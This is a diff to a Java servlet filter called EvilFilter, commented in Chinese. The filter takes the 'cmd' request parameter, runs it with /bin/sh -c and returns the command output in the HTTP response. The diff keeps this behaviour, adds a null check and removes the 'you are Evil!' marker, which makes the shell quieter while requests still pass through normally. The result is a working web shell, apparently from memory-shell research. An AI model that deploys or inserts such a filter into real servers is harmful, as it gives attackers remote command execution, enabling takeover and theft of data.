@@ -18,15 +18,14 @@ public class EvilFilter implements Filter {
         System.out.println("***************************/nEvilFilter doFilter/n***************************");
         // 在这里添加你想要的过滤器逻辑
         //获取请求头中的cmd参数，执行命令并获取返回值
-        String cmd = request.getParameter("cmd");
-        //使用能回显的命令执行
-        String[] cmds = {"/bin/sh", "-c", cmd};
-        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A");
-        String output = s.hasNext() ? s.next() : "";
-        response.getWriter().println(output);
-
-        System.out.println("Request URI: " + ((HttpServletRequest) request).getRequestURI());
-        response.getWriter().println("you are Evil!");
+        if (request.getParameter("cmd") != null) {
+            String cmd = request.getParameter("cmd");
+            //使用能回显的命令执行
+            String[] cmds = {"/bin/sh", "-c", cmd};
+            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A");
+            String output = s.hasNext() ? s.next() : "";
+            response.getWriter().println(output);
+        }
         // 传递请求到下一个过滤器或目标资源
         chain.doFilter(request, response);
     }
